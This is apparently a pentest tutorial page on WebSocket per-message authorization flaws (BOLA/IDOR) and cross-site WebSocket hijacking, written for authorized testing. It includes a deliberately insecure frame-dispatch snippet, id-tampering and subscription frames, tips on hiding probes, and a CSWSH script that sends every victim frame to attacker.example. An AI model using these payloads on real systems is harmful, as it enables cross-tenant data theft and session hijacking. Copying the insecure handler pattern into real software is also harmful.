---
title: "WebSocket per-message authorization: BOLA after the HTTP upgrade"
description: Exploiting long-lived WebSocket sessions that authorize the HTTP upgrade once and then trust every frame—replaying or mutating object ids inside messages to act on other tenants' resources, plus cross-site WebSocket hijacking.
keywords:
  - WebSocket
  - per-message authorization
  - BOLA
  - cross-site WebSocket hijacking
  - CSWSH
  - IDOR
---

# WebSocket per-message authorization

A WebSocket connection authenticates **once**, at the HTTP upgrade. After the `101 Switching Protocols` handshake the socket stays open for minutes or hours, and the application exchanges many independent **frames** over it. The vulnerability class here is the gap between *connection* authorization and *message* authorization: the server proves who you are at connect time, then processes every subsequent frame as if the action it names is already allowed. Each frame is really a separate request—often the moral equivalent of a REST `POST`—and when the per-frame **object-level** check is missing, the socket becomes a broad **BOLA / IDOR** surface.

> **Scope.** For authorized penetration tests, red-team engagements, CTF labs, and code review of systems you own or are contracted to assess. Testing channels without written authorization is unlawful.

## Overview

A typical realtime backend upgrades the request, pulls the user from the session cookie or a bearer token presented in the handshake, and then enters a dispatch loop:

```js
ws.on("message", (raw) => {
  const msg = JSON.parse(raw);
  switch (msg.type) {
    case "order.get":    return send(db.orders.find(msg.orderId));
    case "order.cancel": return db.orders.cancel(msg.orderId);
    case "chat.read":    return send(db.messages.forRoom(msg.roomId));
  }
});
```

Nothing in the loop re-checks that the authenticated user **owns** `msg.orderId` or belongs to `msg.roomId`. The handshake established identity; the handler assumes authority. An attacker who holds a valid session for *any* account can drive the socket and reference another tenant's identifiers.

The decisive question when assessing a WebSocket sink is: *does the frame handler resolve tenant, object id, and action on every message, or only at connect?*

## Where the control lives inside a frame

WebSocket messages are application-defined, so the id an attacker tampers with can sit anywhere in the envelope:

| Location | Example frame | Tampered field |
|----------|---------------|----------------|
| Top-level field | `{"type":"order.get","orderId":1041}` | `orderId` |
| Routing channel | `{"channel":"tenant/42/invoices","op":"list"}` | `tenant/42` |
| Subscription topic | `{"action":"subscribe","topic":"user.9.notifications"}` | `user.9` |
| Nested record | `{"cmd":"update","doc":{"id":"acc_7","role":"admin"}}` | `doc.id`, `role` |

Because the dispatch grammar is bespoke, a mapped id is often a small sequential integer or a predictable slug—easier to enumerate than a REST path because the surface is undocumented and rarely covered by the same authorization middleware as the HTTP routes.

## Exploitation

### Step 1 — capture and understand the protocol

Proxy the client through a tool that speaks WebSocket (Burp shows the upgrade and every frame in the WebSockets history). Record the message grammar: the `type`/`op` field, the id fields, and which frames mutate state versus read it. Note whether ids are integers, UUIDs, or signed tokens.

### Step 2 — replay with another object's id

With two lab accounts (A and B), open a socket **as A** and send a frame that names **B's** resource id:

```
# authenticated as user A
{"type":"order.get","orderId":<B_ORDER_ID>}
{"type":"chat.read","roomId":<B_ROOM_ID>}
```

If A receives B's data, per-message read authorization is missing. Repeat with a state-changing frame (`order.cancel`, `doc.update`) to confirm write-side BOLA. Because one socket can send unlimited frames, Intruder-style iteration over an id range enumerates every object the handler exposes.

### Step 3 — exploit broadcast and subscription fan-out

Pub/sub backends add a second BOLA shape: **subscribing** to a channel you shouldn't see. If the server honors `subscribe` to `topic:"user.<n>.notifications"` without checking `<n>` against the session, you receive another user's live event stream for as long as the socket stays open:

```
{"action":"subscribe","topic":"user.<VICTIM_ID>.notifications"}
```

This is passive interception rather than a single-object read—one frame yields a continuous feed.

### Step 4 — abuse trust established only at connect

Some servers attach a **role** or **tenant** claim to the socket at upgrade and never revisit it, so a privilege granted for one purpose rides every later frame. If an `admin.*` message type is dispatched purely on the connect-time role, and that role was set from a client-supplied handshake field, the socket authorizes privileged operations the HTTP API would reject.

## Cross-site WebSocket hijacking (CSWSH)

WebSocket handshakes are **not** governed by the same-origin policy, and browsers attach cookies to a cross-origin `ws://`/`wss://` upgrade automatically. If the server authenticates the socket **only** from the session cookie and does not validate the `Origin` header or require a CSRF-style token in the handshake, an attacker page can open an authenticated socket in the victim's browser:

```html
<script>
  const ws = new WebSocket("wss://target.example/api/stream");
  ws.onopen  = () => ws.send(JSON.stringify({type:"order.list"}));
  ws.onmessage = (e) =>
    fetch("https://attacker.example/x", {method:"POST", body:e.data});
</script>
```

The victim merely visits the attacker's page. The socket is created with the victim's ambient cookies, the attacker drives it blind, and every inbound frame is exfiltrated cross-origin. CSWSH turns a per-message read into a full two-way hijack of the victim's session: the attacker can both read streamed data and send state-changing frames. Confirm viability by checking whether the handshake succeeds when the `Origin` header is set to an unrelated domain and no unpredictable per-session token is required in the upgrade.

### Combining CSWSH with per-message BOLA

The two bugs compound. CSWSH gives an attacker an **authenticated** socket in the victim's context; missing per-message authorization then lets that socket reach objects across the victim's tenant. Even where the victim is a low-privilege user, a BOLA in the frame handler widens the hijacked socket's reach beyond the victim's own records.

## Practical notes

- **One socket, many identities over time.** Long-lived sockets are often pooled or reused after a privilege change (login, tenant switch). If the server rebinds identity without tearing down the socket, frames sent during the transition may be evaluated under the wrong principal.
- **Binary frames.** Not all protocols are JSON; MessagePack, protobuf, or custom binary framing carry the same ids. Decode the frame format before assuming a field is opaque.
- **Heartbeats as cover.** Interleaving malicious frames with the application's normal ping/keepalive traffic keeps the socket alive and the probes inconspicuous during timing-sensitive enumeration.

## Tools

- **[Burp Suite](https://portswigger.net/burp)** — WebSockets history, plus Repeater's WebSocket mode for replaying and mutating individual frames.
- **[websocat](https://github.com/vi/websocat)** — scriptable command-line WebSocket client for scripted frame injection and enumeration.
- **[wsrepl](https://github.com/doyensec/wsrepl)** — interactive REPL for WebSocket pentesting, including automated fuzzing of message fields.
- A minimal HTML page plus any web server to stage and confirm cross-site WebSocket hijacking.

## References

- [OWASP API Security Top 10: API1 Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- [PortSwigger Web Security Academy: Cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)
- [PortSwigger Web Security Academy: Testing WebSockets](https://portswigger.net/web-security/websockets)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
